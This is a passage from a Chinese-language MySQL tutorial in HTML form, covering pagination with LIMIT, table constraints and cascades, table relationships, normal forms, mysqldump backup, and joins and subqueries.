第一页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 每页显示3条记录 第二页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">-- 每页显示3条记录 第三页</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">LIMIT</span> <span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="8-约束"><a class="markdownIt-Anchor" href="#8-约束">#</a> 8、约束</h1><ul><li>概念：对表中的数据进行限定，保证数据的正确性、有效性和完整性</li><li>分类：<ol><li>主键约束：primary key</li><li>非空约束：not null</li><li>唯一约束：unique</li><li>外键约束：foreign key</li></ol></li></ul><h2 id="81-非空约束"><a class="markdownIt-Anchor" href="#81-非空约束">#</a> 8.1 非空约束</h2><ul><li><p>非空约束：not null</p><ol><li><p>在创建表的时候添加非空约束</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>    id <span class="token keyword">INT</span><span class="token punctuation">,</span>    NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 删除name列的非空约束</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建完表后添加非空约束</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li></ul><h2 id="82-唯一约束"><a class="markdownIt-Anchor" href="#82-唯一约束">#</a> 8.2 唯一约束</h2><ul><li>唯一约束：unique，某一列的值不能重复</li><li>注意<ol><li>唯一约束可以有 null 值，但是只能有一条记录为 null</li></ol></li></ul><ol><li>在创建表的时候添加唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 在创建表时添加唯一约束</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu<span class="token punctuation">(</span>id <span class="token keyword">INT</span><span class="token punctuation">,</span>phone_number <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span> <span class="token comment">-- 手机号</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>创建完表后添加唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> phone_number <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>删除唯一约束</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> phone_number<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="83-主键约束"><a class="markdownIt-Anchor" href="#83-主键约束">#</a> 8.3 主键约束</h2><ul><li>主键：primary key</li><li>注意<ol><li>含义：<strong>非空且唯一</strong></li><li>一张表中只能有一个主键，可以多个字段组成联合主键</li><li>主键就是表中记录的唯一标识</li></ol></li></ul><ol><li>在创建表时添加主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">DROP</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>创建完表后添加主键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="84-主键约束-自动增长"><a class="markdownIt-Anchor" href="#84-主键约束-自动增长">#</a> 8.4 主键约束 - 自动增长</h2><ul><li>概念：如果某一列是数值类型的，使用 <strong>auto_increment</strong> 可以完成值的自动增长</li><li>注意<ol><li>自动增长的值只和上一条的值有关</li><li>自动增长一般会和主键联合使用</li><li>也可以不和主键一起用，但是用的很少</li></ol></li></ul><ol><li>在创建表时添加主键，并完成主键自增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> stu <span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除自动增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span><span class="token punctuation">;</span><span class="token comment">-- 这样不会删除主键，但是可以删除自动增长</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>创建表完成后添加自动增长</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> stu <span class="token keyword">MODIFY</span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">;</span><span class="token comment">-- primaey key可加可不加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="85-外键约束"><a class="markdownIt-Anchor" href="#85-外键约束">#</a> 8.5 外键约束</h2><ul><li>外键约束：foreign key，让表与表产生关系，从而保证数据的正确性</li></ul><ol><li>在创建表时添加外键</li></ol><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>语法：</p><p>create table 表名 (</p><p>​…</p><p>​外键列</p><p>​constraint 外键名称 foreign key 外键列 references 主表名称 (主表列名称);</p><p>)</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> employee<span class="token punctuation">(</span>id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>age <span class="token keyword">INT</span><span class="token punctuation">,</span>dep_id <span class="token keyword">INT</span><span class="token punctuation">,</span> <span class="token comment">-- 外键对应主表的主键</span><span class="token keyword">CONSTRAINT</span> emp_dept_id <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>dep_id<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> department<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除外键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名 <span class="token keyword">DROP</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> 外键名称<span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> employee <span class="token keyword">DROP</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> emp_dept_id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>在创建表之后添加外键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> employee <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> emp_dep_id <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>dep_id<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> department<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="86-外键约束-级联操作"><a class="markdownIt-Anchor" href="#86-外键约束-级联操作">#</a> 8.6 外键约束 - 级联操作</h2><ol><li>添加外键，设置级联更新<ul><li>概念：父表的主键在更新时，子表的外键值也跟着更新</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>添加外键，设置级联删除<ul><li>概念：父表的主键在删除时，会自动删除子表外键中有该父表主键值的那一行数据</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>级联更新和删除可以在一行内一起使用，如</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span> <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>实际开发情况中级联的使用是非常谨慎的</li></ul><h1 id="9-数据库的设计"><a class="markdownIt-Anchor" href="#9-数据库的设计">#</a> 9、数据库的设计</h1><ol><li>多表之间的关系</li><li>数据库设计的范式</li></ol><h2 id="91-多表之间的关系"><a class="markdownIt-Anchor" href="#91-多表之间的关系">#</a> 9.1 多表之间的关系</h2><ol><li>一对一（了解）：<ul><li>如：人和身份证</li><li>分析：一个人只有一个身份证，一个身份证也只能对应一个人</li></ul></li><li>一对多（多对一）：<ul><li>如：部门和员工</li><li>分析：一个部门有多个员工，一个员工只能对应一个部门</li></ul></li><li>多对多：<ul><li>如：学生和课程</li><li>分析：一个学生可以选择很多课程，一个课程也可以被很多学生选择</li></ul></li></ol><h2 id="92-一对多表关系实现"><a class="markdownIt-Anchor" href="#92-一对多表关系实现">#</a> 9.2 一对多表关系实现</h2><ul><li>如：部门和员工</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621205001667.png" alt="image-20220621205001667"></p><ul><li>实现方式：在多的地方去建立外键指向 1 的一方的主键</li><li>在员工表里添加一个外键指向部门表的主键</li></ul><h2 id="93-多对多表关系实现"><a class="markdownIt-Anchor" href="#93-多对多表关系实现">#</a> 9.3 多对多表关系实现</h2><ul><li>如：学生和课程</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621205745740.png" alt="image-20220621205745740"></p><ul><li>实现方式：借助第三章中间表，中间表至少包含两个字段，分别指向两个表的主键</li><li>两个字段要使用联合主键 ——foreign key (sid,cid);</li></ul><h2 id="94-一对一表关系实现"><a class="markdownIt-Anchor" href="#94-一对一表关系实现">#</a> 9.4 一对一表关系实现</h2><ul><li>如：人和身份证</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621210236802.png" alt="image-20220621210236802"></p><ul><li>实现方式：在任何一方添加唯一外键指向另一方的主键</li><li>实际情况中一般会把两张表合成一张表</li></ul><h1 id="10-范式"><a class="markdownIt-Anchor" href="#10-范式">#</a> 10、范式</h1><ul><li>概念：在设计数据库时需要遵循的规范。要遵循后边的范式要求，必须先遵循前边的所有范式要求</li><li>分类：<ol><li>第一范式（1NF）：每一列都是不可分割的原子数据项</li><li>第二范式（2NF）：在第一范式的基础上，非码属性必须完全依赖于候选码（在 1NF 基础上消除非主属性对主码的部分函数依赖 ）<ul><li>几个概念<ol><li>函数依赖：A-----&gt;B，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，则称 B 依赖于 A</li><li>完全函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定需要 A 中所有的属性值</li><li>部分函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定只需要依赖于 A 属性组中某一些值即可</li><li>传递函数依赖：A-----&gt;B，B-----&gt;C，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，再通过 B 属性（属性组）的值可以确定唯一 C 属性的值，则称 C 传递函数依赖于 A</li><li>码：如果在一张表中，一个属性或属性组被其他所有属性所完全依赖，则称这个属性（属性组）为该表的码</li><li>主属性：码属性组中的所有属性</li><li>非主属性：除去码属性组的属性</li></ol></li></ul></li><li>第三范式（3NF）：在 2NF 的基础上，任何非主属性不依赖于其他非主属性（在 2NF 基础上消除传递依赖）</li></ol></li></ul><h1 id="11-数据库的备份和还原"><a class="markdownIt-Anchor" href="#11-数据库的备份和还原">#</a> 11、数据库的备份和还原</h1><h2 id="111-命令行"><a class="markdownIt-Anchor" href="#111-命令行">#</a> 11.1 命令行</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">备份：mysqldump -u用户名 -p密码 数据库名 <span class="token operator">></span> 保存的路径还原：<span class="token number">1</span>. 登录数据库<span class="token number">2</span>. 创建数据库<span class="token number">3</span>. 使用数据库<span class="token number">4</span>. 执行文件，source 文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="112-图形化工具"><a class="markdownIt-Anchor" href="#112-图形化工具">#</a> 11.2 图形化工具</h2><ul><li>根据使用的工具进行导出和导入</li></ul><h1 id="12-多表查询"><a class="markdownIt-Anchor" href="#12-多表查询">#</a> 12、多表查询</h1><ul><li>笛卡尔积：由两个集合 A,B，取这两个集合的所有组成情况</li><li>要完成多表查询，需要消除无用的数据</li><li>多表查询分类<ol><li>内连接查询</li><li>外连接查询</li><li>子查询</li></ol></li></ul><h2 id="121-多表查询-内连接"><a class="markdownIt-Anchor" href="#121-多表查询-内连接">#</a> 12.1 多表查询 - 内连接</h2><ul><li>内连接查询两张表中同时存在的数据，如果某一表的条件语句的字段为空，则这个结果不在结果表中显示</li></ul><ol><li>隐式内连接：使用 where 条件来消除无用的数据</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询所有员工信息和对应部门信息,一般查询的时候会查询部分字段，不会将所有字段都查出来</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">,</span>dept <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token comment">-- 查询员工表的名称，性别，部门表的名称</span><span class="token keyword">SELECT</span> emp<span class="token punctuation">.</span>name<span class="token punctuation">,</span>emp<span class="token punctuation">.</span>gende<span class="token punctuation">,</span>dept<span class="token punctuation">.</span>name <span class="token keyword">FROM</span> emp<span class="token punctuation">,</span>dept <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token comment">-- 查询员工表的名称，性别，部门表的名称，使用表的别名</span><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span>name<span class="token punctuation">,</span>t1<span class="token punctuation">.</span>gende<span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1<span class="token punctuation">,</span>dept t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>显式内连接：<ul><li>语法：<strong>select 字段列表 from 表名 1 inner join 表名 2 on 条件；</strong></li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> dept <span class="token keyword">ON</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">JOIN</span> dept <span class="token keyword">ON</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622092940239.png" alt="image-20220622092940239"></p><ol start="3"><li>内连接查询注意事项：<ol><li>从哪些表中查询数据</li><li>查询条件是什么</li><li>查询哪些字段</li></ol></li></ol><h2 id="122-多表查询-外连接"><a class="markdownIt-Anchor" href="#122-多表查询-外连接">#</a> 12.2 多表查询 - 外连接</h2><ol><li>左外连接<ul><li>语法：<strong>select 字段列表 from 表 1 left [outer] join 表 2 on 条件；</strong></li><li>查询的是左表的所有数据以及两表的交集部分</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> dept t2 <span class="token keyword">ON</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622093548771.png" alt="image-20220622093548771"></p><ol start="2"><li>右外连接<ul><li>语法：<strong>select 字段列表 from 表 1 right [outer] join 表 2 on 条件；</strong></li><li>查询的是右表的所有数据以及两表的交集部分</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1 <span class="token keyword">RIGHT</span> <span class="token keyword">JOIN</span> dept t2 <span class="token keyword">ON</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622093733605.png" alt="image-20220622093733605"></p><h2 id="123-多表查询-子查询"><a class="markdownIt-Anchor" href="#123-多表查询-子查询">#</a> 12.3 多表查询 - 子查询</h2><ul><li>概念：查询中嵌套查询，称嵌套的查询为子查询</li><li>基本演示</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询工资最高的员工信息</span><span class="token comment">-- 1.查询最高的工资是多少 9000</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">;</span><span class="token comment">-- 2.查询员工信息，并且工资等于9000的</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> salary <span class="token operator">=</span> <span class="token number">9000</span><span class="token punctuation">;</span><span class="token comment">-- 一条SQL完成查询，子查询</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>salary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>子查询的不同情况</p><ol><li>子查询的结果是单行单列的<ul><li>子查询可以作为条件，使用<strong>运算符</strong>去判断。运算符：<strong>&gt; &lt; &gt;= &lt;= &lt;&gt; =</strong></li><li>查询工资小于平均工资的人</li><li>SELECT * FROM emp WHERE salary &lt; (SELECT AVG(salary) FROM emp);</li></ul></li><li>子查询的结果是多行单列的<ul><li>子查询可以作为条件，使用运算符 IN 来判断</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询`财务部`和`市场部`所有员工的信息</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> dept <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"财务部"</span> <span class="token operator">OR</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"市场部"</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">OR</span> dept_id <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> dept <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"财务部"</span> <span class="token operator">OR</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"市场部"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>子查询的结果是多行多列的<ul><li>子查询可以作为一张虚拟表来进行表的查询</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> dept t1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>join_date <span class="token operator">></span> <span class="token string">'2011-11-11'</span><span class="token punctuation">)</span> t2 <span class="token keyword">WHERE</span> t1<span class="token punctuation">.</span>id <span class="token operator">=</span> t2<span class="token punctuation">.</span>dept_id<span class="token punctuation">;</span><span class="token comment">-- 使用普通内连接查询</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp t1<span class="token punctuation">,</span> dept t2 <span class="token keyword">WHERE</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id <span class="token operator">AND</span> t1<span class="token punctuation">.</span>join_date <span class="token operator">></span> <span class="token string">'2011-11-11'</span><span class="token punctuation">;</span><span aria-hidden="true" 